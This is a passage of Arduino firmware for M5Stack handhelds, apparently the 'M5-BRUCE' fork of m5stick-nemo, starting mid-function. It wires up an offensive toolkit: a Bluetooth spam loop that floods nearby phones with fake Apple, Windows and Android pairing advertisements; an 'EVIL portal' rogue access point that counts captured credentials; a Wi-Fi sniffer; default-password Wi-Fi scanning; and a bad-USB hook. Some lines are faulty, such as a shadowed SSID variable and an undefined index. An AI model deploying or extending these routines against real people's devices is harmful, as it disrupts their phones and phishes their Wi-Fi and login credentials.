      packet[i++] = 2; // Size
      packet[i++] = 0x0A; // AD Type (Tx Power Level)
      packet[i++] = (rand() % 120) - 100; // -100 to +20 dBm

      oAdvertisementData.addData(std::string((char *)packet, 14));
      for (int i = 0; i < sizeof packet; i ++) {
        Serial.printf("%02x", packet[i]);
      }
      Serial.println("");
    } else {
      Serial.print("AppleJuice Advertisement: ");
      if (deviceType >= 18){
        oAdvertisementData.addData(std::string((char*)data, sizeof(AppleTVPair)));
      } else {
        oAdvertisementData.addData(std::string((char*)data, sizeof(Airpods)));
      }
      for (int i = 0; i < sizeof(Airpods); i ++) {
        Serial.printf("%02x", data[i]);
      }      
      Serial.println("");
    }
    
    pAdvertising->setAdvertisementData(oAdvertisementData);
    pAdvertising->start();
#if defined(M5LED)
    digitalWrite(M5_LED, LOW); //LED ON on Stick C Plus
    delay(10);
     digitalWrite(M5_LED, HIGH); //LED OFF on Stick C Plus
#endif
  }
  if (check_next_press()) {
    if (sourApple || swiftPair || androidPair || maelstrom){
      isSwitching = true;
      current_proc = 16;
      drawmenu(btmenu, btmenu_size);
    } else {
      isSwitching = true;
      current_proc = 8;      
      drawmenu(ajmenu, ajmenu_size);
    }
    sourApple = false;
    swiftPair = false;
    maelstrom = false;
    pAdvertising->stop(); // Bug that keeps advertising in the background. Oops.
    delay(250);
  }
}

/// CREDITS ///
void credits_setup(){
  DISP.fillScreen(WHITE);
  DISP.qrcode("https://github.com/n0xa/m5stick-nemo", 145, 40, 100, 5);
  DISP.setTextColor(BLACK, WHITE);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setCursor(0, 10);
  DISP.print("M5-BRUCE\n");
  DISP.setTextSize(SMALL_TEXT);
  DISP.printf("  %s\n",buildver);
  DISP.println(" For M5Stack");
#if defined(STICK_C_PLUS)
  DISP.println("  StickC-Plus");
#endif
#if defined(STICK_C)
  DISP.println("  StickC");
#endif
#if defined(CARDPUTER)
  DISP.println("  Cardputer");
#endif
  DISP.println("By Noah Axon");
  DISP.println("forked: pr3y");

  DISP.setCursor(155, 5);
  DISP.println("GitHub");
  DISP.setCursor(155, 25);
  DISP.println("Source:");
  DISP.setTextColor(FGCOLOR, BGCOLOR);
}

/// no WiFiSPAM ///
void wifimenu() {
  char emptySSID[32];
  char beaconSSID[32];
  char randomName[32];
  uint8_t channelIndex = 0;
  uint8_t macAddr[6];
  uint8_t wifi_channel = 1;
  uint32_t currentTime = 0;
  uint32_t packetSize = 0;
  uint32_t packetCounter = 0;
  uint32_t attackTime = 0;
  uint32_t packetRateTime = 0;

  // create empty SSID
  for (int i = 0; i < 32; i++)
    emptySSID[i] = ' ';
  // for random generator
  randomSeed(1);

  int spamtype = 1; // no

  DISP.setTextSize(TINY_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
    int ct = 0;
    const char *str;
    switch(spamtype) {
    case 1:

      //TODO: ADD DEAUTHER
      DISP.printf(" - DEAUTHER --- TODO");
      break;

    case 2:
      
      DISP.fillScreen(BGCOLOR);
      DISP.setCursor(0, 0);
      
      DISP.setTextColor(WHITE, BGCOLOR);
      DISP.printf("DPWO-ESP32!     Scanning...\n");


      break;
    case 3:

      DISP.fillScreen(BGCOLOR);
      sniffer_setup();
      break;
  }
  DISP.setTextSize(SMALL_TEXT);

}

void btmaelstrom_setup(){
  rstOverride = false;
  maelstrom = true;
}

void btmaelstrom_loop(){
  swiftPair = false;
  sourApple = true;
  aj_adv();
  if (maelstrom){
    swiftPair = true;
    androidPair = false;
    sourApple = false;
    aj_adv();
  }
  if (maelstrom){
    swiftPair = false;
    androidPair = true;
    sourApple = false;
    aj_adv();
  }
  if (maelstrom){
    swiftPair = false;
    androidPair = false;
    sourApple = false;
    aj_loop(); // roll a random device ID
    aj_adv();
  }
}

/// WIFI MENU ///
MENU wsmenu[] = {
  { "Back", 5},
  { "Scan Wifi", 0},
  { "Deauth(TODO)", 1},
  { "DPWO-ESP32", 2},
  { "Raw sniffer", 3},
  { "EVIL portal", 4},
  { "SSH", 6},
  { "TELNET(TODO)", 7},
};
int wsmenu_size = sizeof(wsmenu) / sizeof (MENU);

void wsmenu_setup() {
  cursor = 0;
  rstOverride = true;
  drawmenu(wsmenu, wsmenu_size);
  delay(500); // Prevent switching after menu loads up
}

void wsmenu_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % wsmenu_size;
    drawmenu(wsmenu, wsmenu_size);
    delay(250);
  }
  if (check_select_press()) {
    int option = wsmenu[cursor].command;
    rstOverride = false;
    //current_proc = 11;
    isSwitching = true;
    switch(option) {
      case 0:
        rstOverride = false;
        isSwitching = true;
        current_proc = 14;
        break;
      case 1:
        //spamtype = 1; //aaaAAAaAAAa no wifispam here
        break;
      case 2:
        current_proc = 22;
        break;
      case 3:
        current_proc = 11;
        break;
      case 4:
        current_proc = 19;
        break;
      case 5:
        current_proc = 1;
        break;
      case 6:
        current_proc = 20;
        break;
      case 7:
        current_proc = 24;
        break;
    }
  }
}

void wscan_drawmenu() {
  char ssid[19];
  DISP.setTextSize(SMALL_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 5, 1);
  // scrolling menu
  if (cursor > 4) {
    for ( int i = 0 + (cursor - 4) ; i < wifict ; i++ ) {
      DISP.print((cursor == i) ? ">" : " ");
      DISP.println(WiFi.SSID(i).substring(0,19));
    }
  } else {
    for ( int i = 0 ; i < wifict ; i++ ) {
      DISP.print((cursor == i) ? ">" : " ");
      DISP.println(WiFi.SSID(i).substring(0,19));
    }
  }
  DISP.print((cursor == wifict) ? ">" : " ");
  DISP.println("[RESCAN]");
  DISP.print((cursor == wifict + 1) ? ">" : " ");
  DISP.println("Back");
}

void wscan_result_setup() {
  cursor = 0;
  rstOverride = true;
  wscan_drawmenu();
  delay(500); // Prevent switching after menu loads up
}

void wscan_result_loop(){
  if (check_next_press()) {
    cursor++;
    cursor = cursor % ( wifict + 2);
    wscan_drawmenu();
    delay(250);
  }
  if (check_select_press()) {
    delay(250);
    if(cursor == wifict){
      rstOverride = false;
      current_proc = 14;
    }
    if(cursor == wifict + 1){
      rstOverride = false;
      isSwitching = true;
      current_proc = 12;
    }
    String encryptType = "";
    switch (WiFi.encryptionType(cursor)) {
    case 1:
      encryptType = "WEP";
      break;
    case 2:
      encryptType = "WPA/PSK/TKIP";
      break;
    case 3:
      encryptType = "WPA/PSK/CCMP";
      break;
    case 4:
      encryptType = "WPA2/PSK/Mixed/CCMP";
      break;
    case 8:
      encryptType = "WPA/WPA2/PSK";
      break ;
    case 0:
      encryptType = "Open";
      break ;
    }
    
    DISP.setTextSize(MEDIUM_TEXT);
    if(WiFi.SSID(cursor).length() > 12){
      DISP.setTextSize(SMALL_TEXT);
    }       
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(5, 1);
    DISP.println(WiFi.SSID(cursor));
    DISP.setTextSize(SMALL_TEXT);
    DISP.printf("Chan : %d\n", WiFi.channel(cursor));
    DISP.printf("Crypt: %s\n", encryptType);
    DISP.print("BSSID:\n" + WiFi.BSSIDstr(i));
    DISP.printf("\nNext: Back\n");
  }
}

void wscan_setup(){
  rstOverride = false;  
  cursor = 0;
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(BIG_TEXT);
  DISP.setCursor(5, 1);
  DISP.println("WiFi Scan");
  delay(2000);
}

void wscan_loop(){
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setCursor(5, 1);
  DISP.println("Scanning...");
  wifict = WiFi.scanNetworks();
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(SMALL_TEXT);
  DISP.setCursor(5, 1);
  if(wifict > 0){
    isSwitching = true;
    current_proc=15;
  }
}


void bootScreen(){
  // Boot Screen
  if(check_next_press()){
    clearSettings();
  }
  #if defined(CARDPUTER)
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(BIG_TEXT);
  DISP.setCursor(40, 0);

  DISP.setTextSize(SMALL_TEXT);
  DISP.printf("           BRUCE");
  DISP.setCursor(1, 20);
  DISP.setTextSize(TINY_TEXT);
  DISP.println(" _________         .    .    cardputer");
  DISP.println(" (..       \\_    ,  |\\  /|");
  DISP.println("  \\      /0  \\  /|  \\ \\/ /");
  DISP.println("   \\______    \\/ |   \\  /");
  DISP.println("      vvvv\\    \\ |   /  |");
  DISP.println("      \\^^^^  ==   \\_/   |");
  DISP.println("       `\\_   ===    \\.  |");
  DISP.println("       / /\\_   \\ /      |");
  DISP.println("       |/   \\_  \\|      /     v0.4");
  DISP.println("              \\________/");



  DISP.setTextSize(BIG_TEXT);
  DISP.setCursor(0, 120);
  DISP.printf("~~~~~~~~~~");

  /*

       _________         .    .
       (..       \_    ,  |\  /|
        \       0  \  /|  \ \/ /
         \______    \/ |   \  /
            vvvv\    \ |   /  |
            \^^^^  ==   \_/   |
             `\_   ===    \.  |
             / /\_   \ /      |
             |/   \_  \|      /
                    \________/snd

                    */


  while(true){
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isChange()) {
      drawmenu(mmenu, mmenu_size);
      delay(250);
      break;
    }
  }
#else
  DISP.println("Next: Side Button");
  DISP.println("Sel : M5 Button");
  DISP.println("Home: Power Button");
  delay(3000);
#endif
}

void qrmenu_drawmenu() {
  DISP.setTextSize(SMALL_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 8, 1);
  for ( int i = 0 ; i < ( sizeof(qrcodes) / sizeof(QRCODE) ) ; i++ ) {
    DISP.print((cursor == i) ? ">" : " ");
    DISP.println(qrcodes[i].name);
  }
}

void qrmenu_setup() {
  cursor = 0;
  rstOverride = true;
  qrmenu_drawmenu();
  delay(500); // Prevent switching after menu loads up
}

void qrmenu_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % ( sizeof(qrcodes) / sizeof(QRCODE) );
    qrmenu_drawmenu();
    delay(250);
  }
  if (check_select_press()) {
    if(qrcodes[cursor].url.length() == 0){
      rstOverride = false;
      isSwitching = true;
      current_proc = 1;
    }else{
      DISP.fillScreen(WHITE);
      DISP.qrcode(qrcodes[cursor].url, 0, 0, 80, 5);
    }
  }
}

/// EVIL PORTAL
/*
    /// SD SELECT TEMPLATE IF HAS SD CARD///
  MENU portal_select[] = {

    { "index.html"}, // We jump to the region menu first
    { "index2.html"},

  };
  int portal_size = sizeof(portal_select) / sizeof(MENU);


/// SD SELECT TEMPLATE IF HAS SD CARD///
MENU portal_select[50]; // Assuming a maximum of 50 HTML files, adjust as needed
int portal_size = 0;

void template_select_setup(){
cursor = 0;
  rstOverride = true;

  File root = SD.open("/");
  
  while (true) {
    File file = root.openNextFile();
    if (!file) {
      break;
    }

    if (file.isDirectory()) {
    } else {
      String filename = file.name();
      if (filename.endsWith(".html")) {
        Serial.print("HTML file: ");
        Serial.println(filename);
        
        //TODO: append filename String to portal_select
      }
    }

    file.close();
  }

  root.close();

  // Draw the menu using the dynamically populated portal_select
  drawmenu(portal_select, portal_size);
}

void template_select_loop(){
//void mmenu_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % 2; // NUM_TEMPLATES
    drawmenu(portal_select,portal_size);
    delay(250);
  }
  if (check_select_press()) {
    rstOverride = false;
    isSwitching = true;
    current_proc = portal_select[cursor].command;
  }
//}


}
*/
String apSsidName = "";

void portal_setup(){
  String apSsidName = "";
  M5Cardputer.Display.clear();
  DISP.setTextSize(SMALL_TEXT);
  DISP.setCursor(0, 0);
  DISP.println("Enter SSID name: ");
  waitForInput(apSsidName);
  //template_select_setup();


 // #endif
  setupWiFi(apSsidName);
  setupWebServer();
  portal_active = true;    
  cursor = 0;
  rstOverride = true;
  printHomeToScreen(apSsidName);
  delay(500); // Prevent switching after menu loads up
    
  /*
#if defined(RTC)
  { "Clock", 0},
#endif
*/




}

void portal_loop(){
  if ((millis() - lastTick) > PortalTickTimer) {
    lastTick = millis();
    if (totalCapturedCredentials != previousTotalCapturedCredentials) {
      previousTotalCapturedCredentials = totalCapturedCredentials;
      printHomeToScreen(apSsidName);
    }
  }
  dnsServer.processNextRequest();
  webServer.handleClient();
  if (check_next_press()){
    shutdownWebServer();
    portal_active = false;
    rstOverride = false;
    isSwitching = true;
    current_proc = 12;
    delay(500);
  }
}

// MICROPHONE

static constexpr const size_t record_number     = 256;
static constexpr const size_t record_length     = 240;
static constexpr const size_t record_size       = record_number * record_length;
static constexpr const size_t record_samplerate = 17000;
static int16_t prev_y[record_length];
static int16_t prev_h[record_length];
static size_t rec_record_idx  = 2;
static size_t draw_record_idx = 0;
static int16_t *rec_data;

//TODO
//#define SD_MIC_PATH "/rec.mp3"

void mic_setup(void) {
    auto cfg = M5.config();

    M5Cardputer.begin(cfg);

    M5Cardputer.Display.startWrite();
    M5Cardputer.Display.setRotation(1);
    M5Cardputer.Display.setTextDatum(top_center);
    M5Cardputer.Display.setTextColor(FGCOLOR);
    M5Cardputer.Display.setFont(&fonts::FreeSansBoldOblique12pt7b);

    rec_data = (typeof(rec_data))heap_caps_malloc(record_size *

                                                      sizeof(int16_t),
                                                  MALLOC_CAP_8BIT);
    memset(rec_data, 0, record_size * sizeof(int16_t));
    M5Cardputer.Speaker.setVolume(255);

    /// Since the microphone and speaker cannot be used at the same time,
    // turn
    /// off the speaker here.
    M5Cardputer.Speaker.end();
    M5Cardputer.Mic.begin();
    M5Cardputer.Display.clear();
    M5Cardputer.Display.fillCircle(70, 15, 8, RED);
    M5Cardputer.Display.drawString("REC", 120, 3);
}

void mic_loop(void) {
    M5Cardputer.update();

    if (M5Cardputer.Mic.isEnabled()) {
        static constexpr int shift = 6;
        auto data                  = &rec_data[rec_record_idx * record_length];
        if (M5Cardputer.Mic.record(data, record_length, record_samplerate)) {
            data = &rec_data[draw_record_idx * record_length];

            int32_t w = M5Cardputer.Display.width();
            if (w > record_length - 1) {
                w = record_length - 1;
            }
            for (int32_t x = 0; x < w; ++x) {
                M5Cardputer.Display.writeFastVLine(x, prev_y[x], prev_h[x],
                                                   TFT_BLACK);
                int32_t y1 = (data[x] >> shift);
                int32_t y2 = (data[x + 1] >> shift);
                if (y1 > y2) {
                    int32_t tmp = y1;
                    y1          = y2;
                    y2          = tmp;
                }
                int32_t y = ((M5Cardputer.Display.height()) >> 1) + y1;
                int32_t h = ((M5Cardputer.Display.height()) >> 1) + y2 + 1 - y;
                prev_y[x] = y;
                prev_h[x] = h;
                M5Cardputer.Display.writeFastVLine(x, prev_y[x], prev_h[x],
                                                   WHITE);
            }
            
            M5Cardputer.Display.display();
            M5Cardputer.Display.fillCircle(70, 15, 8, RED);
            M5Cardputer.Display.drawString("REC", 120, 3);
            if (++draw_record_idx >= record_number) {
                draw_record_idx = 0;
            }
            if (++rec_record_idx >= record_number) {
                rec_record_idx = 0;
            }
        }
    }

    if (M5Cardputer.BtnA.wasHold()) {
        auto cfg               = M5Cardputer.Mic.config();
        cfg.noise_filter_level = (cfg.noise_filter_level + 8) & 255;
        M5Cardputer.Mic.config(cfg);
        M5Cardputer.Display.clear();
        M5Cardputer.Display.fillCircle(70, 15, 8, GREEN);
        M5Cardputer.Display.drawString("NF:" + String(cfg.noise_filter_level),
                                       120, 3);

    } else if (M5Cardputer.BtnA.wasClicked()) {
        if (M5Cardputer.Speaker.isEnabled()) {
            M5Cardputer.Display.clear();
            while (M5Cardputer.Mic.isRecording()) {
                delay(1);
            }
            /// Since the microphone and speaker cannot be used at the same
            /// time, turn off the microphone here.
            M5Cardputer.Mic.end();
            M5Cardputer.Speaker.begin();

            M5Cardputer.Display.fillTriangle(70 - 8, 15 - 8, 70 - 8, 15 + 8,
                                             70 + 8, 15, 0x1c9f);
            M5Cardputer.Display.drawString("PLAY", 120, 3);
            int start_pos = rec_record_idx * record_length;
            if (start_pos < record_size) {
                M5Cardputer.Speaker.playRaw(&rec_data[start_pos],
                                            record_size - start_pos,
                                            record_samplerate, false, 1, 0);
            }
            if (start_pos > 0) {
                M5Cardputer.Speaker.playRaw(rec_data, start_pos,
                                            record_samplerate, false, 1, 0);
            }
            do {
                delay(1);
                M5Cardputer.update();
            } while (M5Cardputer.Speaker.isPlaying());

            /// Since the microphone and speaker cannot be used at the same
            /// time, turn off the speaker here.
            M5Cardputer.Speaker.end();
            M5Cardputer.Mic.begin();

            M5Cardputer.Display.clear();
            M5Cardputer.Display.fillCircle(70, 15, 8, RED);
            M5Cardputer.Display.drawString("REC", 120, 3);
        }
    }
}

/// ENTRY ///
void setup() {
#if defined(CARDPUTER)
  auto cfg = M5.config();
  M5Cardputer.begin(cfg, true);
  pinMode(38, OUTPUT); // Backlight analogWrite range ~150 - 255
#else
  M5.begin();
#endif
  #if defined(USE_EEPROM)
    EEPROM.begin(EEPROM_SIZE);
    Serial.printf("EEPROM 0 - Rotation:   %d\n", EEPROM.read(0));
    Serial.printf("EEPROM 1 - Dim Time:   %d\n", EEPROM.read(1));
    Serial.printf("EEPROM 2 - Brightness: %d\n", EEPROM.read(2));
    Serial.printf("EEPROM 3 - TVBG Reg:   %d\n", EEPROM.read(3));
    if(EEPROM.read(0) > 3 || EEPROM.read(1) > 240 || EEPROM.read(2) > 100 || EEPROM.read(3) > 1) {
      // Assume out-of-bounds settings are a fresh/corrupt EEPROM and write defaults for everything
      Serial.println("EEPROM likely not properly configured. Writing defaults.");
      #if defined(CARDPUTER)
      EEPROM.write(0, 1);    // Right rotation for cardputer
      #else
      EEPROM.write(0, 3);    // Left rotation
      #endif
      EEPROM.write(1, 15);   // 15 second auto dim time
      EEPROM.write(2, 100);  // 100% brightness
      EEPROM.write(3, 0); // TVBG NA Region
      EEPROM.commit();
    }
    rotation = EEPROM.read(0);
    screen_dim_time = EEPROM.read(1);
    brightness = EEPROM.read(2);
    region = EEPROM.read(3);
  #endif
  screenBrightness(brightness);
  dimtimer();
  DISP.setRotation(rotation);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  bootScreen();

  // Pin setup
#if defined(M5LED)
  pinMode(M5_LED, OUTPUT);
  digitalWrite(M5_LED, HIGH); //LEDOFF
#endif
#if !defined(KB)
  pinMode(M5_BUTTON_HOME, INPUT);
  pinMode(M5_BUTTON_RST, INPUT);
#endif
#if defined(M5_BUTTON_MENU)
  pinMode(M5_BUTTON_MENU, INPUT);
#endif
  // Random seed
  randomSeed(analogRead(0));

  // Create the BLE Server
  BLEDevice::init("");
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  // Nemo Portal Init
  setupSdCard();
  bootTime = lastActivity = millis();
}

void loop() {
  // This is the code to handle running the main loops
  // Background processes
  switcher_button_proc();
  screen_dim_proc();
  check_menu_press();
  
  // Switcher
  if (isSwitching) {
    isSwitching = false;
    Serial.printf("Switching To Task: %d\n", current_proc);
    switch (current_proc) {
#if defined(RTC)
      case 0:
        clock_setup();
        break;
#endif
      case 1:
        mmenu_setup();
        break;
      case 2:
        smenu_setup();
        break;
#if defined(RTC)
      case 3:
        timeset_setup();
        break;
#endif
      case 4:
        dmenu_setup();
        break;
      case 5:
        tvbgone_setup();
        break;

      case 6:
        battery_setup();
        break;

#if defined(ROTATION)
      case 7:
        rmenu_setup();
        break;
#endif
      case 8:
        aj_setup();
        break;
      case 9:
        aj_adv_setup();
        break;
      case 10:
        credits_setup();
        break;
      case 11:
        DISP.setCursor(0, 0);
        DISP.fillScreen(BGCOLOR);
        DISP.setTextColor(GREEN, BGCOLOR);
        DISP.printf("Sniffing...");
        sniffer_setup();
        
        break;
      case 12:
        wsmenu_setup();
        break;
      case 13:
        tvbgmenu_setup();
        break;
      case 14:
        wscan_setup();
        break;
      case 15:
        wscan_result_setup();
        break;
      case 16:
        btmenu_setup();
        break;
      case 17:
        btmaelstrom_setup();
        break;
      case 18:
        qrmenu_setup();
        break;
      case 19:
        portal_setup();
        //template_select_setup();
        break;
      case 20:

        ssh_setup();
        break;
      case 21:
        mic_setup();
        break;
      case 22:
        DISP.fillScreen(BGCOLOR);
        DISP.setTextColor(WHITE, BGCOLOR);
        DISP.setTextSize(TINY_TEXT);
        DISP.setCursor(0, 0);
        DISP.printf("DPWO-ESP32!     Scanning...\n");
        dpwoSetup();
        break;
      case 23:

        usb_setup();
        break;
      case 24:
      //telnet_setup();
      break; 
    }
  }

  switch (current_proc) {
#if defined(RTC)
    case 0:
      clock_loop();
      break;
#endif
    case 1:
      mmenu_loop();
      break;
    case 2:
      smenu_loop();
      break;
#if defined(RTC)
    case 3:
      timeset_loop();
      break;
#endif
    case 4:
      dmenu_loop();
      break;
    case 5:
      tvbgone_loop();
      break;

    case 6:
      battery_loop();
      break;

#if defined(ROTATION)
    case 7:
      rmenu_loop();
      break;
#endif
    case 8:
      aj_loop();
      break;
    case 9:
      aj_adv();
      break;
    case 10:
      // noop - just let the credits stay on screen
      break;
    case 11:

      sniffer_loop();
      break;
    case 12:
      wsmenu_loop();
      break;
    case 13:
      tvbgmenu_loop();
      break;
    case 14:
      wscan_loop();
      break;
    case 15:
      wscan_result_loop();
      break;
    case 16:
      btmenu_loop();
      break;
    case 17:
      btmaelstrom_loop();
      break;
    case 18:
      qrmenu_loop();
      break;
    case 19:
      portal_loop();
      //template_select_loop();
      break;
    case 20:
    //bad usb
      ssh_loop();
      break;
    case 21:
      mic_loop();
      break;
    case 22:
      dpwo_loop();
      //no loop for dpwo :P (yet)
      break;
    case 23:
      usb_loop();
      break;
    case 24:
      //telnet_loop();
      break;
    

  }
}

